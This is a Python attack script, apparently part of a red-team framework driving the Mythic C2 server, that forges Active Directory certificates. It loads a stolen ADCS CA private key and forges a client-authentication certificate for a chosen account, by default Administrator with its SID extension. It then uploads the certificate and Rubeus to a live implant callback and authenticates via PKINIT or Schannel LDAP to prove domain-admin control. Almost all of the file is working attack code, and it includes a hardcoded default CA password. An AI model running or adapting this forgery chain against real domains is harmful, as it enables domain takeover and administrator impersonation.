#!/usr/bin/env python3
"""Bounded live proof for ADCS certificate authentication.

No LLM is used. The script converts a previously verified CA private-key
artifact into a local signing context, forges a Windows PKINIT/smartcard-style
account PFX, stages only the forged account PFX to the selected callback, builds
Sage's generic `adcs-certificate-auth` capability into Mythic commands, executes
them, and records DA/certificate-auth effects only from verifier proof.
"""

from __future__ import annotations

import argparse
import ast
import asyncio
import base64
import hashlib
import json
import os
import re
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[3]
os.environ.setdefault("SAGE_ENGAGEMENT_GATE", "1")
os.environ.setdefault("SAGE_ENGAGEMENT_STATE_DIR", str(ROOT / "Payload_Type" / "sage" / ".sage_engagement"))

sys.path.insert(0, str(ROOT / "skills" / "sage-live-runner" / "scripts"))
from mythic import mythic  # noqa: E402
from sage_task import resolve_password  # noqa: E402

sys.path.insert(0, str(ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"))

import capabilities  # noqa: E402
import engagement_ledger  # noqa: E402
import mythic_tools  # noqa: E402

SERVER = "127.0.0.1"
USER = "mythic_admin"

KEY_RE = re.compile(
    r"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
    re.IGNORECASE,
)
CERT_RE = re.compile(r"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----", re.IGNORECASE)
LONG_B64_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/=]{160,})(?![A-Za-z0-9+/=])")
HASH_RE = re.compile(r"(?i)(/(?:password|certificate|cacertpassword|newcertpassword):?)([^\s]+)")


def _display_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode(errors="replace")
    text = str(value)
    stripped = text.strip()
    if len(stripped) >= 3 and stripped[0] in "bB" and stripped[1] in {"'", '"'}:
        try:
            literal = ast.literal_eval(stripped)
            if isinstance(literal, bytes):
                text = literal.decode(errors="replace")
            elif isinstance(literal, str):
                text = literal
        except Exception:
            pass
    return text.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\r", "\n")


def _redact(value: Any, secrets: tuple[str, ...] = ()) -> Any:
    if isinstance(value, dict):
        out = {}
        for key, item in value.items():
            if str(key).casefold() in {
                "password",
                "credential",
                "credential_text",
                "ca_pfx_password",
                "forged_pfx_password",
                "certificate_password",
                "new_cert_password",
            } and not isinstance(item, dict):
                out[key] = "<redacted>"
            else:
                out[key] = _redact(item, secrets)
        return out
    if isinstance(value, list):
        return [_redact(item, secrets) for item in value]
    if isinstance(value, str):
        text = _display_text(value)
        for secret in secrets:
            if secret:
                text = text.replace(secret, "<redacted>")
        text = LONG_B64_RE.sub("<redacted-base64>", text)
        text = HASH_RE.sub(lambda match: f"{match.group(1)}<redacted>", text)
        return text
    return value


def _tail(value: Any, secrets: tuple[str, ...], limit: int = 2200) -> str:
    return str(_redact(str(value or ""), secrets))[-limit:]


def _command_summary(command: dict[str, Any], secrets: tuple[str, ...]) -> str:
    return json.dumps(_redact({
        "command": command.get("command"),
        "capability": command.get("capability"),
        "purpose": command.get("purpose"),
        "expected_probe": command.get("expected_probe"),
        "produces": command.get("produces"),
        "consumes": command.get("consumes"),
        "deferred": command.get("deferred"),
        "parameters": command.get("parameters"),
    }, secrets), sort_keys=True)


def _callback_payload_type(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
    payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
    return str(payload_type.get("name") or callback.get("payloadtype") or "")


def _objective_to_restore(original: str, target_domain: str) -> str:
    text = str(original or "").strip()
    if text and not text.casefold().startswith("sage-engagement:focused-adcs-certificate-auth"):
        return text
    domain = str(target_domain or "").strip().casefold()
    return f"obtain administrative control of {domain}" if domain else text


def _artifact_dir() -> Path:
    path = ROOT / "Payload_Type" / "sage" / ".sage_engagement" / "artifacts"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _latest_ca_artifact(ca_host: str, domain: str) -> Path:
    host_cf = ca_host.casefold()
    domain_cf = domain.casefold()
    candidates = [
        path for path in _artifact_dir().glob("adcs_ca_*")
        if host_cf in path.name.casefold() and domain_cf in path.name.casefold()
        and path.suffix.casefold() in {".pfx", ".txt"}
    ]
    if not candidates:
        return Path("")
    return max(candidates, key=lambda path: path.stat().st_mtime)


def _public_key_bytes(value: Any) -> bytes:
    from cryptography.hazmat.primitives import serialization

    return value.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def _load_ca_key_cert_from_artifact(artifact: Path, pfx_password: str, subject_hint: str):
    from cryptography import x509
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12

    data = artifact.read_bytes()
    if artifact.suffix.casefold() == ".pfx":
        password = pfx_password.encode() if pfx_password else None
        key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
        if key is None or cert is None:
            raise ValueError(f"{artifact} does not contain a CA private key/certificate pair")
        return key, cert, cert.subject.rfc4514_string()

    text = data.decode("utf-8", "replace")
    keys = [(match.start(), match.group(0).encode()) for match in KEY_RE.finditer(text)]
    certs = [(match.start(), match.group(0).encode()) for match in CERT_RE.finditer(text)]
    if not keys or not certs:
        raise ValueError(f"{artifact} does not contain PEM private key and certificate material")

    candidates = []
    for cert_pos, cert_pem in certs:
        cert = x509.load_pem_x509_certificate(cert_pem)
        subject = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        is_ca = issuer == subject
        try:
            is_ca = bool(cert.extensions.get_extension_for_class(x509.BasicConstraints).value.ca or is_ca)
        except Exception:
            pass
        preceding = [(pos, pem) for pos, pem in keys if pos < cert_pos]
        if not preceding:
            continue
        key_pem = preceding[-1][1]
        key = serialization.load_pem_private_key(key_pem, password=None)
        try:
            key_matches = _public_key_bytes(key) == cert.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        except Exception:
            key_matches = False
        if not key_matches:
            continue
        score = 0
        if is_ca:
            score += 10
        if subject_hint and subject_hint.casefold() in subject.casefold():
            score += 5
        if "ca" in subject.casefold():
            score += 1
        candidates.append((score, subject, key, cert))
    if not candidates:
        raise ValueError(f"{artifact} did not contain a matching CA private key/certificate pair")

    candidates.sort(key=lambda item: item[0], reverse=True)
    _score, subject, key, cert = candidates[0]
    return key, cert, subject


def _ca_pfx_from_artifact(artifact: Path, pfx_password: str, subject_hint: str) -> tuple[bytes, str, str]:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12

    key, cert, subject = _load_ca_key_cert_from_artifact(artifact, pfx_password, subject_hint)
    algorithm = (
        serialization.BestAvailableEncryption(pfx_password.encode())
        if pfx_password else serialization.NoEncryption()
    )
    pfx = pkcs12.serialize_key_and_certificates(
        name=b"Sage-ADCS-CA",
        key=key,
        cert=cert,
        cas=None,
        encryption_algorithm=algorithm,
    )
    return pfx, hashlib.sha256(pfx).hexdigest(), subject


def _der_utf8_string(value: str) -> bytes:
    data = value.encode("utf-8")
    if len(data) < 128:
        return b"\x0c" + bytes([len(data)]) + data
    length = len(data).to_bytes((len(data).bit_length() + 7) // 8, "big")
    return b"\x0c" + bytes([0x80 | len(length)]) + length + data


def _ntds_ca_security_extension(account_sid: str, encoding: str = "utf8"):
    from cryptography import x509
    from cryptography.x509.oid import ObjectIdentifier

    value = _der_octet_string(_sid_to_bytes(account_sid)) if str(encoding).casefold() in {"binary", "octet", "octet-string"} else _der_utf8_string(account_sid)
    other_name = _der_sequence(
        _der_oid("1.3.6.1.4.1.311.25.2.1")
        + _der_context_explicit(0, value)
    )
    return x509.UnrecognizedExtension(ObjectIdentifier("1.3.6.1.4.1.311.25.2"), other_name)


def _der_octet_string(value: bytes) -> bytes:
    return b"\x04" + _der_length(len(value)) + value


def _sid_to_bytes(value: str) -> bytes:
    parts = str(value or "").strip().split("-")
    if len(parts) < 3 or parts[0] != "S":
        raise ValueError("invalid SID")
    revision = int(parts[1])
    identifier_authority = int(parts[2])
    sub_authorities = [int(part) for part in parts[3:]]
    if len(sub_authorities) > 255:
        raise ValueError("too many SID subauthorities")
    out = bytearray([revision, len(sub_authorities)])
    out.extend(identifier_authority.to_bytes(6, "big"))
    for sub_authority in sub_authorities:
        out.extend(sub_authority.to_bytes(4, "little"))
    return bytes(out)


def _der_sequence(value: bytes) -> bytes:
    return b"\x30" + _der_length(len(value)) + value


def _der_context_explicit(index: int, value: bytes) -> bytes:
    return bytes([0xA0 + index]) + _der_length(len(value)) + value


def _der_oid(value: str) -> bytes:
    parts = [int(part) for part in value.split(".")]
    if len(parts) < 2:
        raise ValueError("OID must have at least two arcs")
    encoded = bytearray([40 * parts[0] + parts[1]])
    for part in parts[2:]:
        stack = [part & 0x7F]
        part >>= 7
        while part:
            stack.append(0x80 | (part & 0x7F))
            part >>= 7
        encoded.extend(reversed(stack))
    return b"\x06" + _der_length(len(encoded)) + bytes(encoded)


def _der_length(length: int) -> bytes:
    if length < 128:
        return bytes([length])
    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def _authority_key_identifier(ca_cert: Any, ca_key: Any) -> Any:
    from cryptography import x509

    try:
        issuer_ski = ca_cert.extensions.get_extension_for_class(x509.SubjectKeyIdentifier).value
        return x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(issuer_ski)
    except Exception:
        return x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key())


def _crl_distribution_points(ca_cert: Any) -> Any:
    from cryptography import x509

    try:
        return ca_cert.extensions.get_extension_for_class(x509.CRLDistributionPoints).value
    except Exception:
        return x509.CRLDistributionPoints([
            x509.DistributionPoint(
                full_name=[x509.UniformResourceIdentifier("ldap:///")],
                relative_name=None,
                reasons=None,
                crl_issuer=None,
            )
        ])


def _forge_account_pfx(
    artifact: Path,
    ca_pfx_password: str,
    subject_hint: str,
    account: str,
    domain: str,
    forged_password: str,
    account_sid: str = "",
    sid_extension_encoding: str = "utf8",
) -> tuple[bytes, str, str]:
    from datetime import datetime, timedelta, timezone

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID, ObjectIdentifier

    ca_key, ca_cert, _subject = _load_ca_key_cert_from_artifact(artifact, ca_pfx_password, subject_hint)
    cert_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    upn = f"{account}@{domain}"
    now = datetime.now(timezone.utc)
    builder = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, account)]))
        .issuer_name(ca_cert.subject)
        .public_key(cert_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([
                x509.OtherName(ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"), _der_utf8_string(upn)),
                x509.RFC822Name(upn),
            ]),
            critical=False,
        )
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(cert_key.public_key()), critical=False)
        .add_extension(_authority_key_identifier(ca_cert, ca_key), critical=False)
        .add_extension(_crl_distribution_points(ca_cert), critical=False)
        .add_extension(
            x509.ExtendedKeyUsage([
                ExtendedKeyUsageOID.CLIENT_AUTH,
                ObjectIdentifier("1.3.6.1.4.1.311.20.2.2"),
            ]),
            critical=False,
        )
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
    )
    if account_sid:
        builder = builder.add_extension(
            _ntds_ca_security_extension(account_sid, sid_extension_encoding),
            critical=False,
        )
    cert = builder.sign(private_key=ca_key, algorithm=hashes.SHA256())
    algorithm = (
        serialization.BestAvailableEncryption(forged_password.encode())
        if forged_password else serialization.NoEncryption()
    )
    pfx = pkcs12.serialize_key_and_certificates(
        name=upn.encode("utf-8"),
        key=cert_key,
        cert=cert,
        cas=[ca_cert],
        encryption_algorithm=algorithm,
    )
    return pfx, hashlib.sha256(pfx).hexdigest(), cert.subject.rfc4514_string()


def _write_ca_pfx(artifact: Path, engagement_key: str, ca_host: str, domain: str, pfx_password: str, subject_hint: str) -> tuple[Path, str, str]:
    pfx, sha256, subject = _ca_pfx_from_artifact(artifact, pfx_password, subject_hint)
    slug = re.sub(r"[^a-zA-Z0-9_.-]+", "_", f"{engagement_key}_{ca_host}_{domain}").strip("_")
    path = _artifact_dir() / f"adcs_ca_signing_{slug}.pfx"
    path.write_bytes(pfx)
    return path, sha256, subject


def _write_forged_pfx(
    artifact: Path,
    engagement_key: str,
    ca_host: str,
    domain: str,
    account: str,
    ca_pfx_password: str,
    forged_password: str,
    subject_hint: str,
    account_sid: str = "",
    sid_extension_encoding: str = "utf8",
) -> tuple[Path, str, str]:
    pfx, sha256, subject = _forge_account_pfx(
        artifact,
        ca_pfx_password,
        subject_hint,
        account,
        domain,
        forged_password,
        account_sid,
        sid_extension_encoding,
    )
    slug = re.sub(r"[^a-zA-Z0-9_.-]+", "_", f"{engagement_key}_{ca_host}_{domain}_{account}").strip("_")
    path = _artifact_dir() / f"adcs_forged_cert_{slug}.pfx"
    path.write_bytes(pfx)
    return path, sha256, subject


async def _task_output(client: Any, task_display_id: int) -> str:
    rows = await mythic.get_all_task_output_by_id(mythic=client, task_display_id=task_display_id)
    chunks = []
    for row in rows or []:
        raw = row.get("response_text") or ""
        if raw:
            try:
                chunks.append(base64.b64decode(raw).decode("utf-8", "replace"))
                continue
            except Exception:
                pass
        chunks.append(str(row.get("response") or raw or ""))
    return "\n".join(part for part in chunks if part)


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--callback", type=int, default=int(os.environ.get("APOLLO_CB", "14")))
    parser.add_argument("--domain", default=os.environ.get("ADCS_AUTH_DOMAIN", "essos.local"))
    parser.add_argument("--account", default=os.environ.get("ADCS_AUTH_ACCOUNT", "Administrator"))
    parser.add_argument("--ca-host", default=os.environ.get("ADCS_CA_HOST", "braavos"))
    parser.add_argument("--ca-artifact", default=os.environ.get("ADCS_CA_ARTIFACT", ""))
    parser.add_argument("--account-sid", default=os.environ.get("ADCS_AUTH_ACCOUNT_SID", ""))
    parser.add_argument("--sid-extension-encoding", default=os.environ.get("ADCS_AUTH_SID_EXTENSION_ENCODING", "utf8"))
    parser.add_argument("--ca-pfx-password", default=os.environ.get("ADCS_CA_PFX_PASSWORD", "SageCA!2026"))
    parser.add_argument("--forged-pfx-password", default=os.environ.get("ADCS_FORGED_PFX_PASSWORD", ""))
    parser.add_argument("--remote-forged-pfx-path", default=os.environ.get("ADCS_REMOTE_FORGED_PFX_PATH", ""))
    parser.add_argument("--proof-host", default=os.environ.get("ADCS_PROOF_HOST", "meereen.essos.local"))
    parser.add_argument("--timeout", type=int, default=180)
    args = parser.parse_args()

    mythic_tools.ENGAGEMENT_GATE_ENABLED = True
    client = await mythic.login(server_ip=SERVER, username=USER, password=resolve_password())
    callbacks = await mythic.get_all_active_callbacks(client)
    callback = next((item for item in callbacks if int(item.get("display_id") or 0) == args.callback), {})
    if not callback:
        print(f"ERROR: callback {args.callback} not found")
        return 1
    payload_type = _callback_payload_type(callback).casefold()
    print(
        f"target callback: cb{args.callback} payload={payload_type} "
        f"host={callback.get('host')} user={callback.get('user')}"
    )
    if payload_type and payload_type != "apollo":
        print("WARNING: this smoke is Apollo-focused; continuing with discovered payload type")

    tools = mythic_tools.MythicTools(agent_task_id="focused-adcs-certificate-auth")
    tools.client = client
    await tools._ensure_engagement_key()
    engagement_key = tools._eng_key()
    original_objective = str(engagement_ledger.load(engagement_key).get("objective") or "")
    print(f"engagement: {engagement_key}")

    account = args.account.casefold()
    target_domain = args.domain.casefold()
    ca_host = args.ca_host.casefold()
    account_sid = args.account_sid.strip()
    if not account_sid and account == "administrator":
        domain_sid = await tools._resolve_domain_sid(target_domain)
        if domain_sid:
            account_sid = f"{domain_sid}-500"

    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target=f"domain={target_domain};account={account};ca_host={ca_host};callback={args.callback}",
        preconditions=[
            f"adcs-ca-private-key:{ca_host}@{target_domain}",
            f"live-callback:{args.callback}",
        ],
        effects=[f"da:{target_domain}", f"certificate-auth:{account}@{target_domain}"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": target_domain,
            "account": account,
            "ca_host": ca_host,
            "callback_id": str(args.callback),
        },
    )

    preflight_inputs = {
        "certificate_already_forged": True,
        "forged_pfx_path": "C:\\Windows\\Temp\\sage_cert_auth_preflight_unused.pfx",
        "forged_pfx_password": "preflight-unused",
        "proof_host": args.proof_host,
        "preflight_existing_context": True,
    }
    print("\n=== attempt: current-context-preflight ===")
    preflight_plan = json.loads(await tools.build_capability_commands(action, preflight_inputs))
    print(f"builder ok={preflight_plan.get('ok')} reason={preflight_plan.get('reason')}")
    if preflight_plan.get("ok"):
        for index, command in enumerate(preflight_plan.get("commands") or [], 1):
            if not isinstance(command, dict):
                continue
            name = str(command.get("command") or "")
            if not name:
                continue
            expected_probe = str(command.get("expected_probe") or "")
            print(f"\n[preflight {index}/{len(preflight_plan.get('commands') or [])}] issuing {_command_summary(command, ())}")
            output = await tools.issue_task_and_waitfor_task_output(
                name,
                command.get("parameters"),
                args.callback,
                timeout=args.timeout,
            )
            task_id = tools._last_issued_task_display_id
            print(f"task_id={task_id} expected_probe={expected_probe}")
            print(f"output_tail:\n{_tail(output, ())}")
            if expected_probe != "extract_ticket_probe":
                continue
            probe = capabilities.extract_adcs_certificate_auth_probe(output, account, target_domain, "")
            probe["callback_id"] = str(args.callback)
            verdict = capabilities.verify_capability("adcs-certificate-auth", probe)
            print(f"current_context_verdict={verdict.verdict} reason={verdict.reason}")
            if verdict.verdict == "achieved":
                recorded = tools.record_capability_result(
                    action,
                    probe,
                    evidence={
                        "source": "focused_adcs_certificate_auth",
                        "provenance": "current_context_preflight",
                        "mythic_task_id": task_id,
                        "callback_id": args.callback,
                        "ca_host": ca_host,
                        "domain": target_domain,
                        "account": account,
                        "account_sid": account_sid,
                        "proof_host": args.proof_host,
                    },
                )
                restore_objective = _objective_to_restore(original_objective, target_domain)
                if restore_objective:
                    data = engagement_ledger.load(engagement_key)
                    data["objective"] = restore_objective
                    engagement_ledger.save(data, engagement_key)
                print(f"record verdict={recorded.verdict} reason={recorded.reason}")
                print(f"RESULT: achieved da:{target_domain} via existing certificate-auth context for {account}@{target_domain}")
                return 0
            break
    else:
        print(json.dumps(_redact(preflight_plan), indent=2, sort_keys=True))

    artifact = Path(args.ca_artifact) if args.ca_artifact else _latest_ca_artifact(args.ca_host, args.domain)
    if not artifact or not artifact.is_file():
        print(f"ERROR: no CA artifact found for {args.ca_host}@{args.domain}; pass --ca-artifact")
        return 1
    subject_hint = f"{args.domain.split('.', 1)[0]}-ca"
    forged_password = args.forged_pfx_password or (
        "SageCert!" + re.sub(r"[^a-zA-Z0-9]+", "_", f"{account}_{target_domain}_{args.callback}").strip("_")
    )
    local_pfx, ca_pfx_sha256, ca_subject = _write_ca_pfx(
        artifact,
        engagement_key,
        ca_host,
        target_domain,
        args.ca_pfx_password,
        subject_hint,
    )
    forged_pfx, forged_pfx_sha256, forged_subject = _write_forged_pfx(
        artifact,
        engagement_key,
        ca_host,
        target_domain,
        account,
        args.ca_pfx_password,
        forged_password,
        subject_hint,
        account_sid,
        args.sid_extension_encoding,
    )
    print(f"using CA artifact: {artifact}")
    print(f"prepared CA PFX: {local_pfx} sha256={ca_pfx_sha256} subject={ca_subject}")
    print(f"prepared forged PFX: {forged_pfx} sha256={forged_pfx_sha256} subject={forged_subject}")
    if account_sid:
        print(f"forged certificate account SID extension: {account_sid} ({args.sid_extension_encoding})")

    for binary in ("Rubeus.exe",):
        upload_status = json.loads(await tools.ensure_tool_uploaded(binary))
        print(f"{binary} file-store status: {upload_status.get('status')}")
        if upload_status.get("status") not in {"already_present", "uploaded"}:
            print(json.dumps(_redact(upload_status), indent=2, sort_keys=True))
            return 1

    remote_forged_path = args.remote_forged_pfx_path or (
        f"C:\\Windows\\Temp\\sage_forged_cert_{account}_{target_domain}_{args.callback}.pfx"
    )
    cert_file_uuid = await mythic.register_file(client, filename=forged_pfx.name, contents=forged_pfx.read_bytes())
    print(f"registered forged PFX in Mythic file store: {cert_file_uuid}")
    upload_output = await tools.upload_file_by_file_uuid(
        "upload",
        {"File": cert_file_uuid, "Path": remote_forged_path},
        cert_file_uuid,
        args.callback,
        timeout=args.timeout,
    )
    secrets = tuple(value for value in (args.ca_pfx_password, forged_password) if value)
    print(f"forged PFX upload task={tools._last_issued_task_display_id} tail:\n{_tail(upload_output, secrets)}")

    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target=f"domain={target_domain};account={account};ca_host={ca_host};callback={args.callback}",
        preconditions=[
            f"adcs-ca-private-key:{ca_host}@{target_domain}",
            f"live-callback:{args.callback}",
        ],
        effects=[f"da:{target_domain}", f"certificate-auth:{account}@{target_domain}"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": target_domain,
            "account": account,
            "ca_host": ca_host,
            "callback_id": str(args.callback),
        },
    )
    inputs = {
        "certificate_already_forged": True,
        "forged_pfx_path": remote_forged_path,
        "forged_pfx_password": forged_password,
        "proof_host": args.proof_host,
    }
    if account_sid:
        inputs["account_sid"] = account_sid
        inputs["sid_extension_encoding"] = args.sid_extension_encoding
    async def run_auth_attempt(label: str, attempt_inputs: dict[str, Any]) -> tuple[dict[str, Any], Any, int | None, str]:
        print(f"\n=== attempt: {label} ===")
        raw_plan = await tools.build_capability_commands(action, attempt_inputs)
        plan = json.loads(raw_plan)
        print(f"builder ok={plan.get('ok')} reason={plan.get('reason')}")
        if not plan.get("ok"):
            print(json.dumps(_redact(plan, secrets), indent=2, sort_keys=True))
            probe = {"callback_id": str(args.callback), "account": account, "domain": target_domain}
            return probe, capabilities.verify_capability("adcs-certificate-auth", probe), None, "build_failed"
        print("plan commands:", ", ".join(str(command.get("command")) for command in plan.get("commands") or []))

        execution_plan = plan.get("execution_plan") if isinstance(plan.get("execution_plan"), dict) else {}
        proof_marker = ""
        for step in execution_plan.get("steps") or []:
            params = step.get("parameters") if isinstance(step, dict) else {}
            if isinstance(params, dict) and params.get("proof_marker"):
                proof_marker = str(params.get("proof_marker"))
                break

        combined_output = ""
        proof_task_id = None
        final_probe: dict[str, Any] = {}
        final_verdict = capabilities.CapabilityVerification("failed", "not run")
        stop_reason = ""
        for index, command in enumerate(plan.get("commands") or [], 1):
            if not isinstance(command, dict):
                continue
            name = str(command.get("command") or "")
            if not name:
                continue
            print(f"\n[{index}/{len(plan.get('commands') or [])}] issuing {_command_summary(command, secrets)}")
            output = await tools.issue_task_and_waitfor_task_output(
                name,
                command.get("parameters"),
                args.callback,
                timeout=args.timeout,
            )
            task_id = tools._last_issued_task_display_id
            expected_probe = str(command.get("expected_probe") or "")
            print(f"task_id={task_id} expected_probe={expected_probe}")
            print(f"output_tail:\n{_tail(output, secrets)}")
            combined_output = "\n".join(part for part in (combined_output, _display_text(output)) if part)
            if expected_probe == "extract_certificate_pkinit_probe":
                ticket = getattr(tools, "_capability_artifacts", {}).get("kerberos_ticket_base64")
                if not ticket:
                    probe = capabilities.extract_adcs_certificate_auth_probe(output, account, target_domain, proof_marker)
                    probe["callback_id"] = str(args.callback)
                    verdict = capabilities.verify_capability("adcs-certificate-auth", probe)
                    reason = "pkinit_not_supported" if probe.get("pkinit_not_supported") else "pkinit_no_ticket"
                    if probe.get("kdc_rejected") and reason == "pkinit_no_ticket":
                        reason = "kdc_rejected"
                    print(f"pkinit_verdict={verdict.verdict} reason={verdict.reason}")
                    return probe, verdict, task_id, reason
            if expected_probe == "extract_ticket_probe":
                probe = capabilities.extract_adcs_certificate_auth_probe(output, account, target_domain, proof_marker)
                probe["callback_id"] = str(args.callback)
                verdict = capabilities.verify_capability("adcs-certificate-auth", probe)
                if verdict.verdict == "achieved":
                    print("current context already proves target access; recording certificate-auth proof")
                    return probe, verdict, task_id, "current_context"
            if expected_probe == "extract_adcs_certificate_auth_probe":
                final_probe = capabilities.extract_adcs_certificate_auth_probe(output, account, target_domain, proof_marker)
                final_probe["callback_id"] = str(args.callback)
                final_verdict = capabilities.verify_capability("adcs-certificate-auth", final_probe)
                proof_task_id = task_id
                print(f"certificate_auth_verdict={final_verdict.verdict} reason={final_verdict.reason}")
                break
        return final_probe, final_verdict, proof_task_id, stop_reason

    final_probe, final_verdict, proof_task_id, stop_reason = await run_auth_attempt("pkinit-kerberos", dict(inputs))
    if final_verdict.verdict != "achieved" and stop_reason in {"pkinit_not_supported", "kdc_rejected"}:
        print("PKINIT was rejected by the KDC; switching to Schannel LDAP certificate-auth proof")
        schannel_inputs = dict(inputs)
        schannel_inputs["certificate_auth_method"] = "schannel-ldap"
        schannel_inputs["preflight_existing_context"] = False
        schannel_inputs["domain_controller"] = args.proof_host
        final_probe, final_verdict, proof_task_id, stop_reason = await run_auth_attempt("schannel-ldap", schannel_inputs)

    if final_verdict.verdict != "achieved":
        print("RESULT: ADCS certificate-auth DA proof was not achieved in this bounded run")
        return 2

    recorded = tools.record_capability_result(
        action,
        final_probe,
        evidence={
            "source": "focused_adcs_certificate_auth",
            "provenance": "current_context_preflight" if stop_reason == "current_context" else "run",
            "mythic_task_id": proof_task_id,
            "callback_id": args.callback,
            "ca_host": ca_host,
            "domain": target_domain,
            "account": account,
            "account_sid": account_sid,
            "ca_pfx_sha256": ca_pfx_sha256,
            "ca_pfx_artifact_path": str(local_pfx),
            "ca_subject": ca_subject,
            "forged_pfx_sha256": forged_pfx_sha256,
            "forged_pfx_artifact_path": str(forged_pfx),
            "forged_subject": forged_subject,
            "proof_host": args.proof_host,
        },
    )
    restore_objective = _objective_to_restore(original_objective, target_domain)
    if restore_objective:
        data = engagement_ledger.load(engagement_key)
        data["objective"] = restore_objective
        engagement_ledger.save(data, engagement_key)
    print(f"record verdict={recorded.verdict} reason={recorded.reason}")
    print(f"RESULT: achieved da:{target_domain} via certificate-auth:{account}@{target_domain}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
